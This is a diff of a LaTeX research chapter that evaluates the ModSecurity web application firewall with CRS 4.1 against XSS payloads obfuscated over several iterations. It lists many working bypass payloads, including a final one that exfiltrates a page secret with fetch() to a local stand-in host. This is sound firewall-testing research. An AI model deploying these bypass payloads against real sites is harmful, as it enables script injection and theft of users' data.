@@ -1,6 +1,6 @@
 \subsection{Multi Iteration Evaluation}
 \label{sec:multiiteration}
-This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable bypass was found, the result will be used to derive additional firewall rule proposals described under Section~\ref{sec:rulesproposal}.
+This section states the evaluation results of evaluating the ModSecurity firewall using \acrshort{crs} 4.1 against payloads obscured through multiple iterations of application of an evasion technique to them. If a considerable bypass was found, the result is used to derive additional firewall rule proposals, which are described under Section~\ref{sec:rulesproposal}.
 
 \subsubsection{Double Percent Encoding}
 \label{sec:doublepercenc}
@@ -10,7 +10,6 @@ On usage of double percent encoding, the rules with ids \verb|932130| and \verb|
 \begin{lstlisting}[style=basicStyle]
 alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
 \end{lstlisting}
-
 bypassed the evaluated firewall configuration.
 However, this payload would not be valid unless the target also performs multiple step url decoding. Multiple step url decoding is forbidden according to RFC3986 "Uniform Resource Identifier (URI): Generic Syntax" - Section 2.4:
 \begin{quote}
@@ -20,7 +19,6 @@ However, this payload would not be valid unless the target also performs multipl
 	data octet as the beginning of a percent-encoding, or vice versa in
 	the case of percent-encoding an already percent-encoded string. \cite{rfc3986/sec2.4}
 \end{quote}
-
 Therefore, this is not considered a valid bypass.
 
 
@@ -33,13 +31,11 @@ In order to avoid the call to \verb|JSON.parse()|, the payload was percent encod
 \begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python]
 \u{0061}lert("escape")
 \end{lstlisting}
-
 was percent encoded using the Python function \verb|urllib.parse.quote_plus()| to create the payload:
 
 \begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python, caption={\textbackslash u\{0061\}lert("escape") percent encoded bypass}]
 %5Cu%7B0061%7Dlert%28%27escape%27%29
 \end{lstlisting}
-
 The percent encoded payload was sent in a request toward the web application. The evaluated firewall configuration did not trigger a match on this payload, it successfully bypassed the ModSecurity firewall using \acrshort{crs} 4.1. It was tested valid after being percent decoded on the target.
 
 \subsubsection{Eval + JavaScript character escape}
@@ -50,7 +46,6 @@ Characters in String literals can also be replaced by escape sequences in JavaSc
 \begin{lstlisting}[style=basicStyle, language=Python]
 'alert'+'(`concatenation`)'
 \end{lstlisting}
-
 with the intention of bypassing the regular expression filter matching on \verb|alert(| can be improved. The payload needs to be evaluated twice on the target in order to achieve the desired effect. The first evaluation concatenates the string composing the desired JavaScript statements, the second evaluation achieves the desired effect of displaying an alert dialog in the browser through evaluating the JavaScript statements contained in the just concatenated string.
 
 The first way to substitute the evaluation, that concatenates the payload string, is by a payload obscured using JavaScript escape sequences instead of string concatenation:
@@ -58,7 +53,6 @@ The first way to substitute the evaluation, that concatenates the payload string
 \begin{lstlisting}[style=basicStyle, language=Python]
 al\u{0065}rt('escaped')
 \end{lstlisting}
-
 Through substituting the latin character \verb|e|, the firewall does not match on the character sequence \verb|alert(| and the string concatenation can be omitted. However, similar to what was observed under Section~\ref{sec:jsescapesingleiter}, using Unicode code point escaping in JavaScript identifiers causes the \verb|JSON.parse()| function to throw an error. It can be avoided if the payload is percent encoded as stated under Section~\ref{sec:jsencpercenc}.
 
 The second way to substitute the evaluation, that concatenates the payload string, is by using \verb|eval()| in a payload to enforce this evaluation on the target. The original payload extended to use the \verb|eval()| function:
@@ -66,25 +60,22 @@ The second way to substitute the evaluation, that concatenates the payload strin
 \begin{lstlisting}[style=basicStyle, language=Python]
 eval('alert'+'(`concatenation`)')
 \end{lstlisting}
-
 caused multiple firewall rules to trigger, as stated under Section~\ref{sec:functionconstructorsingleeva}. Subsequently, the payload was obscured through JavaScript escape sequences:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 ev\u{0061}l('alert'+'(`escaped`)')
 \end{lstlisting}
-
-Through substituting a part of identifier of the \verb|eval()| function, matches on \verb|eval(|, that are seen in Listing~\ref{lst:evalblocked} under Section~\ref{sec:functionconstructorsingleeva}, are avoided. As stated before, JavaScript Unicode code point escaping must be percent encoded in order to create a valid payload:
+Through substituting a part of the identifier of the \verb|eval()| function, matches on \verb|eval(|, that are seen in Listing~\ref{lst:evalblocked} under Section~\ref{sec:functionconstructorsingleeva}, are avoided. As stated before, JavaScript Unicode code point escaping usage on identifiers must be percent encoded in order to create a valid payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python, caption='ev\textbackslash u\{0061\}l('alert' + '(`escaped`)') percent encoded bypass]
 ev%5Cu%7B0061%7Dl%28%27alert%27%2B%27%28%60escaped%60%29%27%29
 \end{lstlisting}
-
 A similar result to the bypass listed in Listing~\ref{lst:funconbypass} under Section~\ref{sec:functionconstructorsingleeva} has been achieved. However, this payload is valid only if it is transmitted in percent encoded form. For instance, when the payload is transmitted in a URI.
 
 
 \subsubsection{Function Constructor + String Concatenation}
 \label{sec:funconstrconbypass}
-In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
+In this payload, the payload logic should include multiple statements and reveal a secret by accessing a property.
 The basic implementation was blocked by the ModSecurity firewall configured to use \acrshort{crs} 4.1:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption={prompt() blocked}, label={lst:promptblocked}]
@@ -95,13 +86,11 @@ The basic implementation was blocked by the ModSecurity firewall configured to u
 <fileDetails>[line "714"] [id "941390"]<fileDetails>
 <MatchedData>"prompt("</MatchedData>
 \end{lstlisting}
-
 Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 `var s = 'secret'; promp` + `t(s, s)`
 \end{lstlisting}
-
 If this payload is correctly injected into the evaluation test page mentioned under Section~\ref{sec:evaluation}, it results in the following \acrshort{html} code (shortened):
 
 \begin{lstlisting}[style=basicStyle, language=Python]
@@ -109,13 +98,11 @@ If this payload is correctly injected into the evaluation test page mentioned un
 	<img src="0" onerror="`var s = 'secret'; promp` + `t(s, s)`">
 </div>
 \end{lstlisting}
-
-While this executes without exceptions, it does not achieve the wished-for effect. The effect achieved is the concatenation of the two strings \verb|`var s = 'secret'; promp`| and \verb|`t(s, s)`|. As mentioned under Section~\ref{sec:stringconc}, the payload string needs to be evaluted on the target in order to have a functioning payload after obscuring the statements inside with string concatenation. To achieve this, the \verb|Function()| constructor was used:
+While this executes without exceptions, it does not achieve the wished-for effect. The effect achieved is the concatenation of the two strings \verb|`var s = 'secret'; promp`| and \verb|`t(s, s)`|. As mentioned under Section~\ref{sec:stringconc}, the payload string needs to be evaluated on the target in order to have a functioning payload after obscuring the statements inside with string concatenation. To achieve this, the \verb|Function()| constructor was used:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 new Function(`var s = 'secret'; promp` + `t(s, s)`)()
 \end{lstlisting}
-
 When evaluating the firewall against this payload, the payload was blocked according to rule:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption={Function() constructor blocked}, label={lst:funconblocked}]
@@ -126,14 +113,12 @@ When evaluating the firewall against this payload, the payload was blocked accor
 <fileDetails>[line "52"] [id "934100"]<fileDetails>
 <MatchedData>"new Function("</MatchedData>
 \end{lstlisting}
-
 To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted by \verb|[]['constructor']['constructor']()| according to the technique mentioned under Section~\ref{sec:functionconstructor}:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 []['constructor']['constructor'](`var s = 'secret'; promp` + `t(s, s)`)()
 \end{lstlisting}
-
-While this payload successfully bypasses the evaluted firewall configuration, when evaluating this payload using the test code snipped mentioned under Section~\ref{sec:evaluation}, it turned out to be invalid. After parsing and injecting the payload into the \acrshort{html} page according to the following statements:
+While this payload successfully bypasses the evaluated firewall configuration, when evaluating this payload using the test code snipped mentioned under Section~\ref{sec:evaluation}, it turned out to be invalid. After parsing and injecting the payload into the \acrshort{html} page according to the following statements:
 
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
 const injection = 
@@ -141,7 +126,6 @@ const injection =
 
 document.getElementById('div1').insertAdjacentHTML('afterbegin', `<img src=0 onerror=${injection.body}>`)
 \end{lstlisting}
-
 the resulting \acrshort{html} code did not execute the given statements inside the payload as expected. It resulted in the following \acrshort{html} code:
 
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
@@ -149,14 +133,12 @@ the resulting \acrshort{html} code did not execute the given statements inside t
 	<img src="0" onerror="[]['constructor']['constructor'](`var" s="secret" ;="" promp`="" +="" `t(s,="" s)`)()="">
 </div>
 \end{lstlisting}
-
-In order to avoid the splitting of statements synchronous to whitespaces in the payload string, JavaScript comment interference was used.
+In order to avoid the splitting of statements synchronous to whitespaces in the payload string, JavaScript comment substitution was used.
 According to the JavaScript comment substitution technique stated under Section~\ref{sec:jscommentsub}, all whitespaces were replaced by JavaScript comments, creating the payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python, caption={Function() constructor + string concatenation in square bracket notation bypass}, label={lst:funconbypasssbn}]
 []['constructor']['constructor'](`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
 \end{lstlisting}
-
 A request containing this payload bypassed the firewall. After injecting it into the test \acrshort{html} page during validation, it resulted in the valid \acrshort{html} code:
 
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
@@ -165,13 +147,11 @@ A request containing this payload bypassed the firewall. After injecting it into
 </div>
 \end{lstlisting}
 
-
 Similarly, using the dot-syntax instead of bracket-access, the following valid payload bypasses the firewall:
 
 \begin{lstlisting}[style=basicStyle, caption={Function() constructor + string concatenation in dot notation bypass}, language=Python]
 [].constructor.constructor(`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
 \end{lstlisting}
-
 
 \subsubsection{Function Constructor + String Concatenation + fromCharCode()}
 \label{sec:charcodemultiiter}
@@ -180,19 +160,16 @@ Following up on the idea to split the character sequence \verb|String.fromCharCo
 \begin{lstlisting}[style=basicStyle, language=Python]
 String.fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)
 \end{lstlisting}
-
 was split into two parts using the \verb|Function()| constructor and string concatenation:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 [].map.constructor('String.'+'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)')();
 \end{lstlisting}
-
 This payload successfully bypassed the ModSecurity firewall configured to use the \acrshort{crs} 4.1. In order to make this payload execute, another use of the \verb|Function()| constructor and string concatenation was applied:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 [].map.constructor('[].map.constructor('+'String.'+'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'+')();')();
 \end{lstlisting}
-
 On evaluating this payload against the tested firewall, the newly applied obscurity triggered a different filtering rule:
 
 \begin{lstlisting}[style=ruleStyle, language=XML]
@@ -205,13 +182,11 @@ On evaluating this payload against the tested firewall, the newly applied obscur
 <fileDetails>[line "488"] [id "933210"]<fileDetails>
 <MatchedData>"('[].map.constructor(''String.''fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'')();')();"</MatchedData>
 \end{lstlisting}
-
 The regular expression used in this rule:
 
 \begin{lstlisting}[style=basicStyle]
 (?:\((?:.+\)(?:[\"'][\-0-9A-Z_a-z]+[\"'])?\(.+|[^\)]*string[^\)]*\)[\s\x0b\"'\-\.0-9A-\[\]_a-\{\}]+\([^\)]*)|(?:\[[0-9]+\]|\{[0-9]+\}|\$[^\(\),\.\/;\x5c]+|[\"'][\-0-9A-Z\x5c_a-z]+[\"'])\(.+)\);
 \end{lstlisting}
-
 requires a semicolon to finish the statement. In JavaScript, cases exist, where this semicolon is not neccessary. One such case would be the existance of a semicolon finished statement in the code just before where the payload is injected and a newline followed by another function call or variable assignment in the code after where the payload is injected. A case where the semicolon would be neccessary to achieve code execution is the following:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
@@ -223,13 +198,11 @@ requires a semicolon to finish the statement. In JavaScript, cases exist, where 
 
 <statements after>
 \end{lstlisting}
-
 In this case, the JavaScript parser will throw a \verb|SyntaxError|:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 Uncaught SyntaxError: expected expression, got ']'
 \end{lstlisting}
-
 JavaScript is able to automatically insert some semicolons to create valid syntax from statements where the semicolons have been omitted. JavaScript's automatic semicolon insertion rules are stated under \cite{js/autosemi}. Limitations, that arise when accessing the \verb|Function()| constructor with the syntax used in this subsection, are laid out under Section~\ref{sec:functionconstructor} and Section~\ref{sec:payloadlimitations}.
 
 As no such limitations apply where the payload is injected during validation in the context of this evaluation, the payload with the semicolon removed:
@@ -237,7 +210,6 @@ As no such limitations apply where the payload is injected during validation in 
 \begin{lstlisting}[style=basicStyle, language=Python, caption=fromCharCode() bypass]
 [].map.constructor('[].map.constructor('+'String.'+'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'+')();')();
 \end{lstlisting}
-
 successfully bypassed the ModSecurity firewall using \acrshort{crs} 4.1 and validated on the target.
 
 
@@ -249,7 +221,6 @@ Considering the bypassing payload shown in Listing~\ref{lst:funconbypasssbn} sta
 \begin{lstlisting}[style=basicStyle, language=Python]
 []['constructor']['constructor']`${'var s = "secret";promp'+'t`s${s}`'}```
 \end{lstlisting}
-
 This payload caused another firewall rule to trigger:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption={Avoiding () blocked}, label={lst:avoiding () blocked}]
@@ -260,43 +231,36 @@ This payload caused another firewall rule to trigger:
 <fileDetails>[line "291"] [id "932130"]<fileDetails>
 <MatchedData>"${s}"</MatchedData>
 \end{lstlisting}
-
 Evading rule \verb|932130| was possible by using Unicode code point escaping in JavaScript as proposed under Section~\ref{sec:jsescape}. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 []['constructor']['constructor']`${'var s = "secret";promp'+'t`s\u{0024}{s}`'}```
 \end{lstlisting}
-
 This made the payload bypass the ModSecurity firewall using \acrshort{crs} 4.1. During validating, the bypassing payload triggered an error when parsing the request body with \verb|JSON.parse()|. A similar case was mentioned under Section~\ref{sec:jsescapesingleiter}. As the Unicode code point escape is used within a string in this payload, percent encoding is not neccessary. Instead, the back-slash in the character sequence \verb|s\u{0024}| was escaped by prepending it with another back-slash. RFC4627: The application/json Media Type for JavaScript Object Notation (JSON) states that in JSON:
 \begin{quote}
 	there are two-character sequence escape representations of some popular characters.  So, for example, a string containing only a single reverse solidus character may be represented more compactly as \quotes{\textbackslash \textbackslash }. \cite{rfc4627}
 \end{quote}
-
 The resulting payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 []['constructor']['constructor']`${'var s = "secret";promp'+'t`s\\u{0024}{s}`'}```
 \end{lstlisting}
-
-still bypassed the evaluted firewall configuration. It no longer caused an error during parsind. However, the whitespaces in contained JavaScript statements caused the injected payload to form invalid \acrshort{html} code. This was also observed during the evaluation conducted under Section~\ref{sec:funconstrconbypass}. As such, whitespaces in the payload have been replaced by JavaScript inline comments:
+still bypassed the evaluated firewall configuration. It no longer caused an error during parsing. However, the whitespaces in contained JavaScript statements caused the injected payload to form invalid \acrshort{html} code. This was also observed during the evaluation conducted under Section~\ref{sec:funconstrconbypass}. As such, whitespaces in the payload were replaced using JavaScript comment substitution, as stated under Section~\ref{sec:jscommentsub}:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 []['constructor']['constructor']`${'var/**/s/**/=/**/"secret";promp'+'t`s\\u{0024}{s}`'}```
 \end{lstlisting}
-
 This payload bypassed the evaluated firewall configuration. The injected payload formed valid \acrshort{html} code. However, during execution of the payload, another \verb|SyntaxError| was thrown:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 Uncaught SyntaxError: missing formal parameter
 \end{lstlisting}
-
 As stated under Section~\ref{sec:taggedtemplateliterals}, when calling a function using Tagged Template Literals, the first parameter given to the called function is an array containing the strings that surround the \verb|{expression}| placeholders. As stated under Section~\ref{sec:functionconstructor}, the first $n-1$ parameters given to the \verb|Function()| constructors must each be a string that corresponds to a valid JavaScript parameter or a list of such strings separated with commas. 
 Therefore, the payload was extended accordingly:
 
 \begin{lstlisting}[style=basicStyle, language=Python, caption={Avoiding () bypass}, label={lst:avoiding () bypass}]
 []['constructor']['constructor']`someParameterString${'var/**/s/**/=/**/"secret";promp'+'t`s\\u{0024}{s}`'}```
 \end{lstlisting}
-
 When sent in a request towards the web application, this payload successfully bypassed the ModSecurity firewall using \acrshort{crs} 4.1. During validation, it was injected into the validation \acrshort{html} page and executed correctly. 
 
 % It is conspicuous that the payload could bypass the firewall with only the later \verb|$| of the two placeholders: \verb|${expression}| escaped.
@@ -310,12 +274,11 @@ When sent in a request towards the web application, this payload successfully by
 
 \subsubsection{Avoiding \{\}}
 \label{sec:avoidingbypassB}
-A payload thats not using any curly brackets: \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using String Substitution strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, a related payload was created:
+A payload thats not using any curly brackets: \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string substitution strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, a related payload was created:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 [][`constructor`][`constructor`]('pro'+'mpt`see4InInput${2+2}:`')()
 \end{lstlisting}
-
 This payload was blocked by the evaluated firewall configuration:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=Blocked for \$\{\}, label={lst:stringreplaceblocked}]
@@ -326,13 +289,11 @@ This payload was blocked by the evaluated firewall configuration:
 <fileDetails>[line "291"] [id "932130"]<fileDetails>
 <MatchedData>"${2 2}"</MatchedData>
 \end{lstlisting}
-
-On using a String Substitution strategy like mentioned in \ref{sec:stringreplace}, the curly brackets were substituted in the payload: 
+On using a string substitution strategy like mentioned under Section~\ref{sec:stringreplace}, the curly brackets were substituted in the payload: 
 
 \begin{lstlisting}[style=basicStyle, language=Python, caption={Avoiding \{\} bypass}, label={lst:stringreplacepass}]
 [][`constructor`][`constructor`]('pro'+'mpt`see4InInput$'+[open+[]][0][16]+'2+2'+[open+[]][0][36]+':`')()
 \end{lstlisting}
-
 A request equipped with this payload successfully evaded the ModSecurity firewall using \acrshort{crs} 4.1. It validated successfully. 
 
 
@@ -344,8 +305,7 @@ As stated before, a payload containing the \verb|prompt()| function:
 \begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python]
 prompt(',',secret)
 \end{lstlisting}
-
-was blocked by the ModSecurity firewall using \acrshort{crs} 4.1 according to the rule:
+was blocked by the ModSecurity firewall using \acrshort{crs} 4.1, according to the rule:
 
 \begin{lstlisting}[style=ruleStyle, language=XML]
 <payload>prompt(',', secret)</payload>
@@ -355,13 +315,11 @@ was blocked by the ModSecurity firewall using \acrshort{crs} 4.1 according to th
 <fileDetails>[line "714"] [id "941390"]<fileDetails>
 <MatchedData>"prompt("</MatchedData>
 \end{lstlisting}
-
-in order to avoid the \acrshort{crs} rule with id \verb|931390|, that matches on the character sequence \verb|prompt(|, Tagged Template Literals have been used to obscure the payload:
+In order to avoid the \acrshort{crs} rule with id \verb|931390|, that matches on the character sequence \verb|prompt(|, Tagged Template Literals have been used to obscure the payload:
 
 \begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python]
 prompt`${secret}`
 \end{lstlisting}
-
 this payload bypassed the initially triggered rule but triggered a different rule:
 
 \begin{lstlisting}[style=ruleStyle, language=XML]
@@ -372,7 +330,6 @@ this payload bypassed the initially triggered rule but triggered a different rul
 <fileDetails>[line "291"] [id "932130"]<fileDetails>
 <MatchedData>"${secret}"</MatchedData>
 \end{lstlisting}
-
 Based on this result, it stands to reason that the next step should be to avoid that parts of the payload match on the regular expression: \verb|\$(?:\{.*\})|, which is a simplified form of the regular expression used in the \acrshort{crs} rule with id \verb|932130|.
 
 Previous results stated in this section either use JavaScript's character escaping (Section~\ref{sec:avoidingbypassA}) or string concatenation and substitution strategies (Section~\ref{sec:avoidingbypassB}). Single iteration results stated under Section~\ref{sec:uninormsingleiter} have shown that replacing parts of a payload with unicode symbols successfully makes payloads bypass the evaluated firewall. The payloads mentioned under Section~\ref{sec:uninormsingleiter} depend on Unicode normalization implemented by the web server receiving those requests.
@@ -382,7 +339,6 @@ If the web server is using Unicode normalization (NFKC) to normalize incoming re
 \begin{lstlisting}[style=basicStyle, language=Python]
 prompt`\uFE69{secret}`
 \end{lstlisting}
-
 Similar to the evaluation results stated under Section~\ref{sec:unicodeinjsontest}, the \acrshort{crs} 4.1 rule with id \verb|920540| got triggered by the unicode escape sequence:
 
 \begin{lstlisting}[style=ruleStyle, language=XML]
@@ -393,7 +349,6 @@ Similar to the evaluation results stated under Section~\ref{sec:unicodeinjsontes
 <fileDetails>[line "1263"] [id "920540"]<fileDetails>
 <MatchedData>"x5cuFE69"</MatchedData>
 \end{lstlisting}
-
 The ModSecurity log file does not mention any transformations used by the rule before checking for matching character sequences. This was confirmed by looking at the rule with id \verb|920540| in the file \verb|REQUEST-920-PROTOCOL-ENFORCEMENT.conf| where it states: \verb|t:none|. Based on this observation, the JavaScript escape sequences evaluation results stated under Section~\ref{sec:jsescapesingleiter} and the unicode normalization results stated under Section~\ref{sec:uninormsingleiter}, three techniques to evade \acrshort{crs} 4.1 rule with id \verb|920540| seem promising:
 
 \begin{enumerate}
@@ -407,13 +362,11 @@ The ModSecurity log file does not mention any transformations used by the rule b
 \begin{lstlisting}[style=basicStyle, language=Python]
 urllib.parse.quote_plus("prompt`\uFE69{secret}`")
 \end{lstlisting}
-
 which returns the payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 prompt%60%EF%B9%A9%7Bsecret%7D%60
 \end{lstlisting}
-
 This payload successfully bypassed the evaluated firewall.
 
 (2.) Using a Unicode code point escape sequence introduced in ES6, the payload:
@@ -421,7 +374,6 @@ This payload successfully bypassed the evaluated firewall.
 \begin{lstlisting}[style=basicStyle, language=Python]
 prompt`\u{FE69}{secret}`
 \end{lstlisting}
-
 successfully bypassed the evaluated firewall. However, this payload can not be parsed error free. Further explanation is stated under Section~\ref{sec:jsescapesingleiter}.
 
 (3.) When directly putting the small dollar sign character (U+FE69) into the payload (in this document, the character (U+FE69) is replaced by the regular \$ sign surrounded by whitespaces):
@@ -429,7 +381,6 @@ successfully bypassed the evaluated firewall. However, this payload can not be p
 \begin{lstlisting}[style=basicStyle, language=Python]
 prompt` $ {secret}`
 \end{lstlisting}
-
 the resulting payload bypassed the ModSecurity firewall using \acrshort{crs} 4.1. It was validated successfully.
 
 In the proceeding of this section, only option 3.: directly using (U+FE69), will be considered. 
@@ -439,31 +390,26 @@ At this point, the payload is still dependend on the web server performing Unico
 \begin{lstlisting}[style=basicStyle, language=Python]
 prompt` $ {secret}`
 \end{lstlisting}
-
 as a string and an argument to the \verb|eval()| function. The call to the \verb|normalize()| function is appended to the payload string:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 eval('prompt` $ {secret}`'.normalize('NFKC'))
 \end{lstlisting}
-
 The \verb|eval()| function will be used to evaluate the normalized payload string. Similar to the results stated under Section~\ref{sec:functionconstructorsingleeva}, the payload that is using the \verb|eval()| function was blocked. In the next iteration, \verb|eval()| was substituted using the technique described under Section~\ref{sec:functionconstructor}. The obscured payload after this iteration:
 
 \begin{lstlisting}[style=basicStyle, language=Python, caption=Forced Unicode Normalization bypass, label={lst:forcedunicodenormbypass}]
 [].map.constructor('prompt` $ {secret}`'.normalize('NFKC'))()
 \end{lstlisting}
-
 bypassed \acrshort{crs} 4.1 rules that try to prohibit payloads including the character sequence of \verb|eval(|. When injected into the validation \acrshort{html} page and executed, the payload first is force normalized. This makes it semantically equal to the payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 prompt`${secret}`
 \end{lstlisting}
-
 which is semantically equal (as defined in this work) to the initial payload stated in this subsection:
 
 \begin{lstlisting}[style=basicStyle, language=Python]
 prompt(',',secret)
 \end{lstlisting}
-
 
 % but still matches on rule with id \verb|920540| and message: \quotes{Possible Unicode character bypass detected}. Therefore, in the following iteration, the payload was percent encoded, again using the \verb|quote_plus()| python function, which returned:
 %
@@ -485,13 +431,11 @@ As stated under Section~\ref{sec:htmlcharrefsingleeva}, three blacklisting rules
 \begin{lstlisting}[style=basicStyle, language=Python]
 <a href=javascript:alert('a')>ClickMeFor$</a>
 \end{lstlisting}
-
 After obscuring the payload with a single iteration of \acrshort{html} character reference substitution, the modified payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
 <a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
 \end{lstlisting}
-
 successfully bypassed two of the three rules that caused the firewall to block the request.
 
 On escaping the left parenthesis: \verb|(| in the javascript function \verb|alert()|, which was part of the matched data that caused rule with id \verb|941390| to match (see Listing~\ref{lst:storedxssinjblocked}), the payload:
@@ -499,7 +443,6 @@ On escaping the left parenthesis: \verb|(| in the javascript function \verb|aler
 \begin{lstlisting}[style=basicStyle, language=Python, caption=HTML Character Reference bypass, label={lst:htmlcharacterreferencebypass}, escapeinside=\^\^]
 <a href=jav^\&\#x61;script:alert\&\#x28;^'a')>ClickMeFor$</a>
 \end{lstlisting}
-
 successfully bypassed the ModSecurity firewall using \acrshort{crs} 4.1.
 
 
@@ -511,7 +454,6 @@ The following payload could be used by an attacker intending to exploit a XSS vu
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
 <a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a>
 \end{lstlisting}
-
 A request containing this payload was blocked by the ModSecurity firewall using \acrshort{crs} 4.1 based on 4 rule triggers:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=Secret exfiltration XSS blocked, label={lst:storedxssblocked}]
@@ -537,21 +479,18 @@ A request containing this payload was blocked by the ModSecurity firewall using 
 <fileDetails>[line "323"] [id "941210"]<fileDetails>
 <MatchedData>"javascript:v"</MatchedData>
 \end{lstlisting}
-
 \acrshort{html} character reference substitution was used to substitute certain characters.
-On escaping of the latin character \verb|a| in \verb|j&#97vascript|, the payload:
+On escaping of the latin character \verb|a| in \verb|javascript:|, the payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
 <a href=j&^\#^97vascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a>
 \end{lstlisting}
-
 evaded the \acrshort{crs} 4.1 rules with ids \verb|941170| and \verb|941210|.
-On escaping the \verb|.| in \\ \verb|getElementsByName('name')[0]&#46innerHTML|, the payload:
+On escaping the \verb|.| in \\ \verb|getElementsByName('name')[0].innerHTML|, the payload:
 
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
 <a href=j&^\#^97vascript:var secret = document.getElementsByName('name')[0]&^\#^46innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a>
 \end{lstlisting}
-
 successfully evaded \acrshort{crs} 4.1 rule with id \verb|941180|.
 Finally one of the forward-slashes \verb|/| in the url-string given to the JavaScript function \verb|fetch()| was escaped by prepending it with a back-slash \verb|\|.
 Escaping any normal character with a back-slash \verb|\| is allowed in JavaScript (Section~\ref{sec:jsescape}) and successfully made the payload evade the last remaining rule: \verb|934110|.
@@ -560,14 +499,12 @@ The bypassing payload:
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
 <a href=j&^\#^97vascript:var secret = document.getElementsByName('name')[0]&^\#^46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a>
 \end{lstlisting}
-
 After injecting this payload into the \acrshort{html} document during validation, it turned out that the resulting \acrshort{html} code was split according to the whitespaces given in the JavaScript statements. A similar case to what was observed in Section~\ref{sec:funconstrconbypass}.
-Whitespaces contained in the JavaScript statements of the bypassing but invalid payload were substituted by comments to create the payload:
+Whitespaces contained in the JavaScript statements of the bypassing but invalid payload were substituted by comments, as stated under Section~\ref{sec:jscommentsub}, to create the payload:
 
 \begin{lstlisting}[style=basicStyle, caption=Secret exfiltration XSS bypass, language=Python, escapeinside=\^\^]
 <a href=j&^\#^97vascript:var/**/secret/**/=/**/document.getElementsByName('name')[0]&^\#^46innerHTML;var/**/data/**/=/**/{body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a>
 \end{lstlisting}
-
 When sent in a request towards the web application, this payload bypassed the ModSecurity firewall using \acrshort{crs} 4.1 and was successfully validated on the target.
 
 
